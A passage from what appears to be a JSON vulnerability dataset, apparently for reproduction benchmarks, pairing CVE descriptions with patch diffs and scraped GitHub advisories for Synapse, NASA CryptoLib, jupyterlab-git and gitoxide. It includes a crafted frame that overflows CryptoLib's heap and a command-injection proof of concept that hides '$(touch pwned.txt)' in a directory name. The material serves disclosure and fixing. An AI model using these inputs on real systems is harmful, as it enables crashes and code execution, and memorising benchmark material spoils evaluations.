v3 base metrics\nAttack vector\nNetwork\nAttack complexity\nLow\nPrivileges required\nLow\nUser interaction\nNone\nScope\nUnchanged\nConfidentiality\nNone\nIntegrity\nLow\nAvailability\nHigh\nLearn more about base metrics\nCVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:H\nCVE ID\nCVE-2025-30355\nWeaknesses\nNo CWEs\nFooter\n\u00a9 2025 GitHub, Inc.\nFooter navigation\nTerms\nPrivacy\nSecurity\nStatus\nDocs\nContact\nManage cookies\nDo not share my personal information",
                "effective": false,
                "effective_reason": "The advisory does not include specific code or exact steps for reproducing the issue.",
                "url": "https://github.com/element-hq/synapse/security/advisories/GHSA-v56r-hwv5-mxg6"
            }
        ],
        "sw_version": "v1.127.0",
        "sw_version_wget": "https://github.com/element-hq/synapse/archive/refs/tags/v1.127.0.zip"
    },
    "CVE-2025-30356": {
        "cwe": [
            {
                "id": "CWE-191",
                "value": "CWE-191: Integer Underflow (Wrap or Wraparound)"
            },
            {
                "id": "CWE-787",
                "value": "CWE-787: Out-of-bounds Write"
            }
        ],
        "description": "CryptoLib provides a software-only solution using the CCSDS Space Data Link Security Protocol - Extended Procedures (SDLS-EP) to secure communications between a spacecraft running the core Flight System (cFS) and a ground station. In 1.3.3 and earlier, a heap buffer overflow vulnerability persists in the Crypto_TC_ApplySecurity function due to an incomplete validation check on the fl (frame length) field. Although CVE-2025-29912 addressed an underflow issue involving fl, the patch fails to fully prevent unsafe calculations. As a result, an attacker can still craft malicious frames that cause a negative tf_payload_len, which is then interpreted as a large unsigned value, leading to a heap buffer overflow in a memcpy call.",
        "languages": [
            "C"
        ],
        "patch_commits": [
            {
                "content": "Merge commit from fork\n\ntc_apply/process UTs and underflow fix\n\nFilename: include/crypto_error.h:\n```\n@@ -153,8 +153,9 @@\n#define CRYPTO_LIB_ERR_INVALID_FHECF                                        (-79)\n #define CRYPTO_LIB_ERR_TM_SECONDARY_HDR_SIZE                                (-80)\n #define CRYPTO_LIB_ERR_TM_SECONDARY_HDR_VN                                  (-81)\n+#define CRYPTO_LIB_ERR_TC_FRAME_LENGTH_MISMATCH                             (-82)\n \n-#define CRYPTO_CORE_ERROR_CODES_MAX -81\n+#define CRYPTO_CORE_ERROR_CODES_MAX -82\n \n // Define codes for returning MDB Strings, and determining error based on strings\n #define CAM_ERROR_CODES     600\n```\n\nFilename: src/core/crypto_error.c:\n```\n@@ -102,7 +102,8 @@\nchar *crypto_enum_errlist_core[] = {(char *)\"CRYPTO_LIB_SUCCESS\",\n                                     (char *)\"CRYPTO_LIB_ERR_TM_FL_LT_MAX_FRAME_SIZE\",\n                                     (char *)\"CRYPTO_LIB_ERR_INVALID_FHECF\",\n                                     (char *)\"CRYPTO_LIB_ERR_TM_SECONDARY_HDR_SIZE\",\n-                                    (char *)\"CRYPTO_LIB_ERR_TM_SECONDARY_HDR_VN\"};\n+                                    (char *)\"CRYPTO_LIB_ERR_TM_SECONDARY_HDR_VN\",\n+                                    (char *)\"CRYPTO_LIB_ERR_TC_FRAME_LENGTH_MISMATCH\"};\n \n char *crypto_enum_errlist_config[] = {\n     (char *)\"CRYPTO_CONFIGURATION_NOT_COMPLETE\",\n```\n\nFilename: src/core/crypto_tc.c:\n```\n@@ -992,6 +992,13 @@\nint32_t Crypto_TC_ApplySecurity_Cam(const uint8_t *p_in_frame, const uint16_t in\n         return status;\n     }\n \n+    if (temp_tc_header.fl + 1 != in_frame_length)\n+    {\n+        status = CRYPTO_LIB_ERR_TC_FRAME_LENGTH_MISMATCH;\n+        mc_if->mc_log(status);\n+        return status;\n+    }\n+\n #ifdef SA_DEBUG\n     printf(KYEL \"DEBUG - Printing SA Entry for current frame.\\n\" RESET);\n     Crypto_saPrint(sa_ptr);\n\n@@ -1033,16 +1040,20 @@\nint32_t Crypto_TC_ApplySecurity_Cam(const uint8_t *p_in_frame, const uint16_t in\n     uint8_t fecf_len        = FECF_SIZE;\n     uint8_t ocf_len         = TELEMETRY_FRAME_OCF_CLCW_SIZE;\n     Crypto_TC_Calc_Lengths(&fecf_len, &segment_hdr_len, &ocf_len);\n+    \n     // Calculate tf_payload length here to be used in other logic\n-\n-    if (temp_tc_header.fl <= TC_FRAME_HEADER_SIZE - segment_hdr_len - fecf_len + 1)\n+    int16_t payload_calc = temp_tc_header.fl - TC_FRAME_HEADER_SIZE - segment_hdr_len - fecf_len + 1;\n+    //check if payload length underflows\n+    if (payload_calc < 0)\n     {\n+#ifdef TC_DEBUG\n+        printf(\"Payload Calculation Underflow: %d\\n\", payload_calc);\n+#endif\n         status = CRYPTO_LIB_ERR_TC_FRAME_LENGTH_UNDERFLOW;\n         mc_if->mc_log(status);\n         return status;\n     }\n-\n-    tf_payload_len = temp_tc_header.fl - TC_FRAME_HEADER_SIZE - segment_hdr_len - fecf_len + 1;\n+    tf_payload_len = (uint16_t)payload_calc;\n \n     /**\n      * A note on plaintext: Take a permissive approach to allow the lengths of fields that aren't going to be used.\n\n@@ -1826,9 +1837,9 @@\nint32_t Crypto_TC_ProcessSecurity_Cam(uint8_t *ingest, int *len_ingest, TC_t *tc\n     tc_sdls_processed_frame->tc_header.fsn = (uint8_t)ingest[byte_idx];\n     byte_idx++;\n \n-    if (*len_ingest < tc_sdls_processed_frame->tc_header.fl + 1) // Specified frame length larger than provided frame!\n+    if (tc_sdls_processed_frame->tc_header.fl + 1 != *len_ingest) // Specified frame length larger than provided frame!\n     {\n-        status = CRYPTO_LIB_ERR_INPUT_FRAME_LENGTH_SHORTER_THAN_FRAME_HEADERS_LENGTH;\n+        status = CRYPTO_LIB_ERR_TC_FRAME_LENGTH_MISMATCH;\n         mc_if->mc_log(status);\n         return status;\n     }\n\n@@ -1844,14 +1855,6 @@\nint32_t Crypto_TC_ProcessSecurity_Cam(uint8_t *ingest, int *len_ingest, TC_t *tc\n         return status;\n     } // Unable to get necessary Managed Parameters for TC TF -- return with error.\n \n-    // The frame thinks it should be size X, but we received <X bytes\n-    if ((tc_sdls_processed_frame->tc_header.fl + 1) < *len_ingest)\n-    {\n-        status = CRYPTO_LIB_ERR_TC_FRAME_LENGTH_UNDERFLOW;\n-        mc_if->mc_log(status);\n-        return status;\n-    }\n-\n     // Segment Header\n     Crypto_TC_Set_Segment_Header(tc_sdls_processed_frame, ingest, &byte_idx);\n\n@@ -1908,13 +1911,6 @@\nint32_t Crypto_TC_ProcessSecurity_Cam(uint8_t *ingest, int *len_ingest, TC_t *tc\n \n     Crypto_TC_Calc_Lengths(&fecf_len, &segment_hdr_len, &ocf_len);\n \n-    if (tc_sdls_processed_frame->tc_header.fl <= TC_FRAME_HEADER_SIZE - segment_hdr_len - fecf_len + 1)\n-    {\n-        status = CRYPTO_LIB_ERR_TC_FRAME_LENGTH_UNDERFLOW;\n-        mc_if->mc_log(status);\n-        return status;\n-    }\n-\n     // Parse & Check FECF\n     status = Crypto_TC_Parse_Check_FECF(ingest, len_ingest, tc_sdls_processed_frame);\n     if (status != CRYPTO_LIB_SUCCESS)\n```\n\nFilename: test/unit/ut_tc_apply.c:\n```\n@@ -1480,6 +1480,7 @@\nUTEST(TC_APPLY_SECURITY, TC_KEY_STATE_TEST)\n UTEST(TC_APPLY_SECURITY, TC_HEAP_BUFFER_OVERFLOW_TEST)\n {\n     remove(\"sa_save_file.bin\");\n+    int status = CRYPTO_LIB_SUCCESS;\n     // Setup & Initialize CryptoLib\n     Crypto_Config_CryptoLib(KEY_TYPE_INTERNAL, MC_TYPE_INTERNAL, SA_TYPE_INMEMORY, CRYPTOGRAPHY_TYPE_LIBGCRYPT,\n                             IV_INTERNAL, CRYPTO_TC_CREATE_FECF_TRUE, TC_PROCESS_SDLS_PDUS_TRUE, TC_HAS_PUS_HDR,\n\n@@ -1490,7 +1491,8 @@\nUTEST(TC_APPLY_SECURITY, TC_HEAP_BUFFER_OVERFLOW_TEST)\n     GvcidManagedParameters_t TC_UT_Managed_Parameters = {\n         1, 0x0003, 0, TC_NO_FECF, AOS_FHEC_NA, AOS_IZ_NA, 0, TC_NO_SEGMENT_HDRS, 1024, TC_OCF_NA, 1};\n     Crypto_Config_Add_Gvcid_Managed_Parameters(TC_UT_Managed_Parameters);\n-    Crypto_Init();\n+    status = Crypto_Init();\n+    ASSERT_EQ(CRYPTO_LIB_SUCCESS, status);\n     // Test string\n     char *test_frame_pt_h   = \"6403000000\";\n     char *test_frame_pt_b   = NULL;\n\n@@ -1506,7 +1508,41 @@\nUTEST(TC_APPLY_SECURITY, TC_HEAP_BUFFER_OVERFLOW_TEST)\n \n     Crypto_Shutdown();\n     free(test_frame_pt_b);\n-    ASSERT_EQ(CRYPTO_LIB_ERR_TC_FRAME_LENGTH_UNDERFLOW, return_val);\n+    ASSERT_EQ(CRYPTO_LIB_ERR_TC_FRAME_LENGTH_MISMATCH, return_val);\n+}\n+\n+UTEST(TC_APPLY_SECURITY, TC_HEAP_BUFFER_OVERFLOW_TEST_2)\n+{\n+    remove(\"sa_save_file.bin\");\n+    int status = CRYPTO_LIB_SUCCESS;\n+    // Setup & Initialize CryptoLib\n+    Crypto_Config_CryptoLib(KEY_TYPE_INTERNAL, MC_TYPE_INTERNAL, SA_TYPE_INMEMORY, CRYPTOGRAPHY_TYPE_LIBGCRYPT,\n+                            IV_INTERNAL, CRYPTO_TC_CREATE_FECF_TRUE, TC_PROCESS_SDLS_PDUS_TRUE, TC_HAS_PUS_HDR,\n+                            TC_IGNORE_SA_STATE_FALSE, TC_IGNORE_ANTI_REPLAY_FALSE, TC_UNIQUE_SA_PER_MAP_ID_TRUE,\n+                            TC_CHECK_FECF_TRUE, 0x3F, SA_INCREMENT_NONTRANSMITTED_IV_TRUE);\n+    // Crypto_Config_Add_Gvcid_Managed_Parameter(0, 0x0003, 0, TC_HAS_FECF, TC_NO_SEGMENT_HDRS, TC_OCF_NA, 1024,\n+    // AOS_FHEC_NA, AOS_IZ_NA, 0);\n+    GvcidManagedParameters_t TC_UT_Managed_Parameters = {\n+        0, 0x0003, 0, TC_HAS_FECF, AOS_FHEC_NA, AOS_IZ_NA, 0, TC_HAS_SEGMENT_HDRS, 1024, TC_OCF_NA, 1};\n+    Crypto_Config_Add_Gvcid_Managed_Parameters(TC_UT_Managed_Parameters);\n+    status = Crypto_Init();\n+    ASSERT_EQ(CRYPTO_LIB_SUCCESS, status);\n+    // Test string\n+    char *test_frame_pt_h   = \"20030006190031FA2A79206F7F0DAD55CE54899DD37FA6D007B4E86DB4E86DA4B4E867\";\n+    char *test_frame_pt_b   = NULL;\n+    int   test_frame_pt_len = 0;\n+\n+    hex_conversion(test_frame_pt_h, (char **)&test_frame_pt_b, &test_frame_pt_len);\n+\n+    uint8_t *ptr_enc_frame = NULL;\n+    uint16_t enc_frame_len = 0;\n+    int32_t  return_val    = CRYPTO_LIB_ERROR;\n+\n+    return_val = Crypto_TC_ApplySecurity((uint8_t *)test_frame_pt_b, test_frame_pt_len, &ptr_enc_frame, &enc_frame_len);\n+\n+    Crypto_Shutdown();\n+    free(test_frame_pt_b);\n+    ASSERT_EQ(CRYPTO_LIB_ERR_TC_FRAME_LENGTH_MISMATCH, return_val);\n }\n \n UTEST_MAIN();\n```\n\nFilename: test/unit/ut_tc_process.c:\n```\n@@ -656,7 +656,7 @@\nUTEST(TC_PROCESS, ERROR_TC_INPUT_FRAME_TOO_SHORT_FOR_SPECIFIED_FRAME_LENGTH_HEAD\n     tc_sdls_processed_frame = malloc(sizeof(uint8_t) * TC_SIZE);\n     memset(tc_sdls_processed_frame, 0, (sizeof(uint8_t) * TC_SIZE));\n \n-    char    *test_frame_pt_h   = \"200304260000020000000000000000000000309e09deeaa375487983a89f3ed7519a230baf22\";\n+    char    *test_frame_pt_h   = \"200304260000020000000000000000000000309e09deeaa375487983a89f3ed7519a230baf22\";//\n     uint8_t *test_frame_pt_b   = NULL;\n     int      test_frame_pt_len = 0;\n\n@@ -670,7 +670,7 @@\nUTEST(TC_PROCESS, ERROR_TC_INPUT_FRAME_TOO_SHORT_FOR_SPECIFIED_FRAME_LENGTH_HEAD\n     hex_conversion(test_frame_pt_h, (char **)&test_frame_pt_b, &test_frame_pt_len);\n     // Should fail, as frame length violates the managed parameter\n     status = Crypto_TC_ProcessSecurity(test_frame_pt_b, &test_frame_pt_len, tc_sdls_processed_frame);\n-    ASSERT_EQ(CRYPTO_LIB_ERR_INPUT_FRAME_LENGTH_SHORTER_THAN_FRAME_HEADERS_LENGTH, status);\n+    ASSERT_EQ(CRYPTO_LIB_ERR_TC_FRAME_LENGTH_MISMATCH, status);\n \n     Crypto_Shutdown();\n     free(test_frame_pt_b);\n\n@@ -1326,7 +1326,7 @@\nUTEST(TC_PROCESS, TC_HEAP_BUFFER_OVERFLOW_TEST)\n \n     status = Crypto_TC_ProcessSecurity(test_frame_pt_b, &test_frame_pt_len, tc_sdls_processed_frame);\n \n-    ASSERT_EQ(CRYPTO_LIB_ERR_TC_FRAME_LENGTH_UNDERFLOW, status);\n+    ASSERT_EQ(CRYPTO_LIB_ERR_TC_FRAME_LENGTH_MISMATCH, status);\n     free(test_frame_pt_b);\n     free(tc_sdls_processed_frame);\n     Crypto_Shutdown();\n\n@@ -1375,10 +1375,45 @@\nUTEST(TC_PROCESS, TC_PROCESS_PREP_AAD_UNDERFLOW_TEST)\n \n     status = Crypto_TC_ProcessSecurity(test_frame_pt_b, &test_frame_pt_len, tc_sdls_processed_frame);\n \n-    ASSERT_EQ(CRYPTO_LIB_ERR_TC_FRAME_LENGTH_UNDERFLOW, status);\n+    ASSERT_EQ(CRYPTO_LIB_ERR_TC_FRAME_LENGTH_MISMATCH, status);\n     free(test_frame_pt_b);\n     free(tc_sdls_processed_frame);\n     Crypto_Shutdown();\n }\n \n+UTEST(TC_PROCESS, TC_HEAP_BUFFER_OVERFLOW_TEST_2)\n+{\n+    remove(\"sa_save_file.bin\");\n+    int status = CRYPTO_LIB_SUCCESS;\n+    // Setup & Initialize CryptoLib\n+    Crypto_Config_CryptoLib(KEY_TYPE_INTERNAL, MC_TYPE_INTERNAL, SA_TYPE_INMEMORY, CRYPTOGRAPHY_TYPE_LIBGCRYPT,\n+                            IV_INTERNAL, CRYPTO_TC_CREATE_FECF_TRUE, TC_PROCESS_SDLS_PDUS_TRUE, TC_HAS_PUS_HDR,\n+                            TC_IGNORE_SA_STATE_FALSE, TC_IGNORE_ANTI_REPLAY_FALSE, TC_UNIQUE_SA_PER_MAP_ID_TRUE,\n+                            TC_CHECK_FECF_TRUE, 0x3F, SA_INCREMENT_NONTRANSMITTED_IV_TRUE);\n+    // Crypto_Config_Add_Gvcid_Managed_Parameter(0, 0x0003, 0, TC_HAS_FECF, TC_NO_SEGMENT_HDRS, TC_OCF_NA, 1024,\n+    // AOS_FHEC_NA, AOS_IZ_NA, 0);\n+    GvcidManagedParameters_t TC_UT_Managed_Parameters = {\n+        0, 0x0003, 0, TC_HAS_FECF, AOS_FHEC_NA, AOS_IZ_NA, 0, TC_HAS_SEGMENT_HDRS, 1024, TC_OCF_NA, 1};\n+    Crypto_Config_Add_Gvcid_Managed_Parameters(TC_UT_Managed_Parameters);\n+    status = Crypto_Init();\n+    ASSERT_EQ(CRYPTO_LIB_SUCCESS, status);\n+\n+    TC_t *tc_sdls_processed_frame;\n+    tc_sdls_processed_frame = malloc(sizeof(uint8_t) * TC_SIZE);\n+    memset(tc_sdls_processed_frame, 0, (sizeof(uint8_t) * TC_SIZE));\n+\n+    // Test string\n+    char *test_frame_pt_h   = \"20030006190031FA2A79206F7F0DAD55CE54899DD37FA6D007B4E86DB4E86DA4B4E867\";\n+    uint8_t *test_frame_pt_b   = NULL;\n+    int   test_frame_pt_len = 0;\n+\n+    hex_conversion(test_frame_pt_h, (char **)&test_frame_pt_b, &test_frame_pt_len);\n+\n+    status = Crypto_TC_ProcessSecurity(test_frame_pt_b, &test_frame_pt_len, tc_sdls_processed_frame);\n+\n+    Crypto_Shutdown();\n+    free(test_frame_pt_b);\n+    ASSERT_EQ(CRYPTO_LIB_ERR_TC_FRAME_LENGTH_MISMATCH, status);\n+}\n+\n UTEST_MAIN();\n```",
                "url": "https://github.com/nasa/CryptoLib/commit/59d1bce7608c94c6131ef4877535075b0649799c"
            }
        ],
        "published_date": "2025-04-01T22:06:22.576Z",
        "sec_adv": [
            {
                "content": "Skip to content\nNavigation Menu\nProduct\nSolutions\nResources\nOpen Source\nEnterprise\nPricing\nSearch or jump to...\nSign in\nSign up\nAppearance settings\nDismiss alert\nnasa\n/\nCryptoLib\nPublic\nNotifications You must be signed in to change notification settings\nFork 34\nStar 102\nCode\nIssues\n41\nPull requests\n5\nActions\nProjects\n1\nWiki\nSecurity\n7\nInsights\nAdditional navigation options\nHeap Buffer Overflow via Incomplete Length Check in `Crypto_TC_ApplySecurity`\nCritical jlucas9 published GHSA-6w2x-w7w3-85w2 on Apr 1Apr 1, 2025\nPackage\nNo package listed\nAffected versions\n<= 1.3.3\nPatched versions\nNone\nDescription\nSummary\nA heap buffer overflow vulnerability persists in the Crypto_TC_ApplySecurity function due to an incomplete validation check on the fl (frame length) field. Although a previous advisory addressed an underflow issue involving fl, the patch fails to fully prevent unsafe calculations. As a result, an attacker can still craft malicious frames that cause a negative tf_payload_len, which is then interpreted as a large unsigned value, leading to a heap buffer overflow in a memcpy call.\nDetails\nThe vulnerable code resides in crypto_tc.c inside the Crypto_TC_ApplySecurity_Cam function:\nif (temp_tc_header.fl <= TC_FRAME_HEADER_SIZE - segment_hdr_len - fecf_len + 1)\n{\n    status = CRYPTO_LIB_ERR_TC_FRAME_LENGTH_UNDERFLOW;\n    mc_if->mc_log(status);\n    return status;\n}\n\n// This underflow can still happen\nuint16_t tf_payload_len = temp_tc_header.fl - TC_FRAME_HEADER_SIZE - segment_hdr_len - fecf_len + 1;\nmemcpy((p_new_enc_frame + index), (p_in_frame + TC_FRAME_HEADER_SIZE + segment_hdr_len), tf_payload_len);\nThe current patch checks if fl <= constant, but this is not sufficient to prevent an underflow in the tf_payload_len calculation. For instance, with fl = 6, segment_hdr_len = 1, and fecf_len = 2, the resulting tf_payload_len becomes -1, which is interpreted as 65535 when cast to uint16_t. This causes a massive memcpy, corrupting heap memory.\nProof of Concept\nA minimal input frame can still bypass the patch and trigger a crash:\n20 03 00 06 19 31 FA 2A 79 20 6F 7F 0D AD 55 CE 54 89 9D D3 7F A6 D0 07 B4 E8 6D B4 E8 6D A4 B4 E8 67\nRun this frame through Crypto_TC_ApplySecurity() with ASan enabled. ASan output will show:\nREAD of size 65535 at 0x... thread T0\n#0 in __asan_memcpy\n#1 in Crypto_TC_ApplySecurity_Cam (crypto_tc.c:1161)\n...\nSUMMARY: AddressSanitizer: heap-buffer-overflow\nThe frame length field (fl) was set to 6, causing the underflow.\nWhen executing vie GDB the following behavior can be seen:\n----- Crypto_TC_ApplySecurity END -----\nmalloc(): corrupted top size\nProgram received signal SIGABRT, Aborted.\nIndicating Heap Corruption.\nImpact\nDenial of Service (DoS): Crashes due to corrupted heap.\nPotential Remote Code Execution (RCE): Under certain memory layouts and protections.\nAffected Version\nLatest version at commit: 01b7402cf07c3ee0ddf422de7c20a3d87fff8a87\nRecommendation\nReplace the existing check with a safer version that validates the result of the tf_payload_len calculation:\nint16_t payload_calc = temp_tc_header.fl - TC_FRAME_HEADER_SIZE - segment_hdr_len - fecf_len + 1;\nif (payload_calc < 0) {\n    printf(\"[!] tf_payload_len underflow detected: fl=%d -> tf_payload_len=%d\\n\", temp_tc_header.fl, payload_calc);\n    status = CRYPTO_LIB_ERR_TC_FRAME_LENGTH_UNDERFLOW;\n    mc_if->mc_log(status);\n    return status;\n}\ntf_payload_len = (uint16_t)payload_calc;\nSeverity\nCritical\n9.8\n/ 10\nCVSS v3 base metrics\nAttack vector\nNetwork\nAttack complexity\nLow\nPrivileges required\nNone\nUser interaction\nNone\nScope\nUnchanged\nConfidentiality\nHigh\nIntegrity\nHigh\nAvailability\nHigh\nLearn more about base metrics\nCVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H\nCVE ID\nCVE-2025-30356\nWeaknesses\nCWE-191 CWE-787\nCredits\nmirkobitetto\nFinder\njuriSacchetta\nCoordinator\ndanmaam\nCoordinator\nFooter\n\u00a9 2025 GitHub, Inc.\nFooter navigation\nTerms\nPrivacy\nSecurity\nStatus\nDocs\nContact\nManage cookies\nDo not share my personal information",
                "effective": true,
                "effective_reason": "The advisory provides a fragment of input data and clear steps outlining how to reproduce the issue using that data along with tools such as AddressSanitizer and GDB.",
                "url": "https://github.com/nasa/CryptoLib/security/advisories/GHSA-6w2x-w7w3-85w2"
            }
        ],
        "sw_version": "v1.3.3",
        "sw_version_wget": "https://github.com/nasa/CryptoLib/archive/refs/tags/v1.3.3.zip"
    },
    "CVE-2025-30370": {
        "cwe": [
            {
                "id": "CWE-78",
                "value": "CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')"
            }
        ],
        "description": "jupyterlab-git is a JupyterLab extension for version control using Git. On many platforms, a third party can create a Git repository under a name that includes a shell command substitution string in the syntax $(<command>). These directory names are allowed in macOS and a majority of Linux distributions. If a user starts jupyter-lab in a parent directory of this inappropriately-named Git repository, opens it, and clicks \"Git > Open Git Repository in Terminal\" from the menu bar, then the injected command <command> is run in the user's shell without the user's permission. This issue is occurring because when that menu entry is clicked, jupyterlab-git opens the terminal and runs cd <git-repo-path> through the shell to set the current directory. Doing so runs any command substitution strings present in the directory name, which leads to the command injection issue described here. A previous patch provided an incomplete fix. This vulnerability is fixed in 0.51.1.",
        "languages": [
            "TypeScript",
            "Python"
        ],
        "patch_commits": [
            {
                "content": "Merge commit from fork\n\nSee the advisory for more details.\n\nFilename: src/commandsAndMenu.tsx:\n```\n@@ -164,31 +164,13 @@\nexport function addCommands(\n     label: trans.__('Open Git Repository in Terminal'),\n     caption: trans.__('Open a New Terminal to the Git Repository'),\n     execute: async args => {\n-      const main = (await commands.execute(\n-        'terminal:create-new',\n-        args\n-      )) as MainAreaWidget<ITerminal.ITerminal>;\n+      const cwd = gitModel.pathRepository;\n+      const main = (await commands.execute('terminal:create-new', {\n+        ...args,\n+        cwd\n+      })) as MainAreaWidget<ITerminal.ITerminal>;\n \n-      try {\n-        if (gitModel.pathRepository !== null) {\n-          const terminal = main.content;\n-          terminal.session.send({\n-            type: 'stdin',\n-            content: [\n-              `cd \"${gitModel.pathRepository\n-                .split('\"')\n-                .join('\\\\\"')\n-                .split('`')\n-                .join('\\\\`')}\"\\n`\n-            ]\n-          });\n-        }\n-\n-        return main;\n-      } catch (e) {\n-        console.error(e);\n-        main.dispose();\n-      }\n+      return main;\n     },\n     isEnabled: () =>\n       gitModel.pathRepository !== null &&\n```",
                "url": "https://github.com/jupyterlab/jupyterlab-git/commit/b46482993f76d3a546015c6a94ebed8b77fc2376"
            }
        ],
        "published_date": "2025-04-03T22:00:44.476Z",
        "sec_adv": [
            {
                "content": "Skip to content\nNavigation Menu\nProduct\nSolutions\nResources\nOpen Source\nEnterprise\nPricing\nSearch or jump to...\nSign in\nSign up\nAppearance settings\nDismiss alert\njupyterlab\n/\njupyterlab-git\nPublic\nNotifications You must be signed in to change notification settings\nFork 348\nStar 1.5k\nCode\nIssues\n105\nPull requests\n10\nDiscussions\nActions\nProjects\nSecurity\n1\nInsights\nAdditional navigation options\nCommand injection vulnerability in \"Open Git Repository in Terminal\"\nHigh dlqqq published GHSA-cj5w-8mjf-r5f8 on Apr 3Apr 3, 2025\nPackage\npip jupyterlab-git\n(\npip\n)\nAffected versions\n<=0.51.0\nPatched versions\n>=0.51.1\nDescription\nOverview\nOn many platforms, a third party can create a Git repository under a name that includes a shell command substitution 1 string in the syntax $(<command>). These directory names are allowed in macOS and a majority of Linux distributions 2. If a user starts jupyter-lab in a parent directory of this inappropriately-named Git repository, opens it, and clicks \"Git > Open Git Repository in Terminal\" from the menu bar, then the injected command <command> is run in the user's shell without the user's permission.\nThis issue is occurring because when that menu entry is clicked, jupyterlab-git opens the terminal and runs cd <git-repo-path> through the shell to set the current directory 3. Doing so runs any command substitution strings present in the directory name, which leads to the command injection issue described here. A previous patch provided an incomplete fix 4.\nScope of Impact\nThis issue allows for arbitrary code execution via command injection. A wide range of actions are permitted by this issue, including but not limited to: modifying files, exfiltrating data, halting services, or compromising the server's security rules.\nWe have scanned the source code of jupyterlab-git for other command injection risks, and have not found any at the time of writing.\nThis issue was reproduced on the latest release of jupyterlab-git, v0.51.0. The steps taken to reproduce this issue are described in the \"Proof-of-concept\" section below.\nProof-of-concept\nCreate a new directory via mkdir test/ && cd test/.\nCreate a new Git repository under test/ with a command substitution string in the directory name by running these commands:\nmkdir '$(touch pwned.txt)'\ncd '$(touch pwned.txt)/'\ngit init\ncd ..\nStart JupyterLab from test/ by running jupyter lab.\nWith JupyterLab open in the browser, double click on $(touch pwned.txt) in the file browser.\nFrom the top menu bar, click \"Git > Open Git Repository in Terminal\".\nVerify that pwned.txt is created under test/. This demonstrates the command injection issue described here.\nProof-of-concept mitigation\nThe issue can be mitigated by the patch shown below.\nPatch (click to expand)\nThis patch removes the cd <git-repo-path> shell command that causes the issue. To preserve the existing behavior, the cwd argument is set to <git-repo-path> when a terminal session is created via the terminal:create-new JupyterLab command. This preserves the existing application behavior while mitigating the command injection issue.\nWe have verified that this patch works when applied to a local installation of jupyterlab-git. We have also verified that the cwd argument is available in all versions of JupyterLab 4, so this patch should be fully backwards-compatible.\nWorkarounds\nWe recommend that users upgrade to the patched versions listed on this GHSA. However, if a user is unable to upgrade, there are 3 different ways to mitigate this vulnerability without upgrading to a patch.\nDisable terminals on jupyter-server level:\nc.ServerApp.terminals_enabled =  False\nDisable the terminals server extension:\njupyter server extension disable jupyter_server_terminals\nDisable the lab extension:\njupyter labextension disable @jupyterlab/terminal-extension\nFootnotes\nhttps://www.gnu.org/software/bash/manual/html_node/Command-Substitution.html \u21a9\nhttps://www.gnu.org/software/libc/manual/html_node/File-Name-Portability.html \u21a9\nhttps://github.com/jupyterlab/jupyterlab-git/blob/7eb3b06f0092223bd5494688ec264527bbeb2195/src/commandsAndMenu.tsx#L175-L184 \u21a9\nhttps://github.com/jupyterlab/jupyterlab-git/pull/1196 \u21a9\nSeverity\nHigh\n7.4\n/ 10\nCVSS v3 base metrics\nAttack vector\nLocal\nAttack complexity\nHigh\nPrivileges required\nLow\nUser interaction\nRequired\nScope\nChanged\nConfidentiality\nLow\nIntegrity\nHigh\nAvailability\nHigh\nLearn more about base metrics\nCVSS:3.1/AV:L/AC:H/PR:L/UI:R/S:C/C:L/I:H/A:H\nCVE ID\nCVE-2025-30370\nWeaknesses\nCWE-78\nCredits\ndlqqq\nAnalyst\nrpwagner\nCoordinator\nkrassowski\nAnalyst\nFooter\n\u00a9 2025 GitHub, Inc.\nFooter navigation\nTerms\nPrivacy\nSecurity\nStatus\nDocs\nContact\nManage cookies\nDo not share my personal information",
                "effective": true,
                "effective_reason": "The advisory includes a detailed proof of concept with steps to reproduce the vulnerability.",
                "url": "https://github.com/jupyterlab/jupyterlab-git/security/advisories/GHSA-cj5w-8mjf-r5f8"
            }
        ],
        "sw_version": "v0.51.0",
        "sw_version_wget": "https://github.com/jupyterlab/jupyterlab-git/archive/refs/tags/v0.51.0.zip"
    },
    "CVE-2025-31130": {
        "cwe": [
            {
                "id": "CWE-328",
                "value": "CWE-328: Use of Weak Hash"
            }
        ],
        "description": "gitoxide is an implementation of git written in Rust. Before 0.42.0, gitoxide uses SHA-1 hash implementations without any collision detection, leaving it vulnerable to hash collision attacks. gitoxide uses the sha1_smol or sha1 crate, both of which implement standard SHA-1 without any mitigations for collision attacks. This means that two distinct Git objects with colliding SHA-1 hashes would break the Git object model and integrity checks when used with gitoxide. This vulnerability is fixed in 0.42.0.",
        "languages": [
            "Rust"
        ],
        "patch_commits": [
            {
                "content": "Merge pull request #1915 from emilazy/push-qvyqmopsoltr\n\nfeat!: detect SHA\u20101 collision attacks\n\nFilename: .github/workflows/ci.yml:\n```\n@@ -391,7 +391,7 @@\njobs:\n       - name: features of gix-features\n         run: |\n           set +x\n-          for feature in progress parallel io-pipe crc32 zlib zlib-rust-backend fast-sha1 rustsha1 cache-efficiency-debug; do\n+          for feature in progress parallel io-pipe crc32 zlib zlib-rust-backend cache-efficiency-debug; do\n             (cd gix-features && cargo build --features \"$feature\" --target \"$TARGET\")\n           done\n       - name: crates with 'wasm' feature\n```\n\nFilename: .github/workflows/release.yml:\n```\n@@ -137,8 +137,7 @@\njobs:\n             os: windows-latest\n           - target: aarch64-pc-windows-msvc\n             os: windows-latest\n-        # on linux we build with musl which causes trouble with open-ssl. For now, just build max-pure there\n-        # even though we could also build with `--features max-control,http-client-reqwest,gitoxide-core-blocking-client,gix-features/fast-sha1` for fast hashing.\n+        # on linux we build with musl which causes trouble with open-ssl. For now, just build max-pure there.\n         # It's a TODO.\n         exclude:\n           - target: x86_64-unknown-linux-musl\n```\n\nFilename: Cargo.lock:\n```\n@@ -1615,7 +1615,6 @@\ndependencies = [\n  \"document-features\",\n  \"gix-chunk 0.4.11\",\n  \"gix-date 0.9.3\",\n- \"gix-features 0.40.0\",\n  \"gix-hash 0.16.0\",\n  \"gix-testtools\",\n  \"memmap2\",\n\n@@ -1846,15 +1845,12 @@\ndependencies = [\n  \"crossbeam-channel\",\n  \"document-features\",\n  \"flate2\",\n- \"gix-hash 0.16.0\",\n  \"gix-trace 0.1.12\",\n  \"gix-utils 0.1.14\",\n  \"libc\",\n  \"once_cell\",\n  \"parking_lot\",\n  \"prodash 29.0.1\",\n- \"sha1\",\n- \"sha1_smol\",\n  \"thiserror 2.0.12\",\n  \"walkdir\",\n ]\n\n@@ -1967,6 +1963,7 @@\ndependencies = [\n  \"gix-features 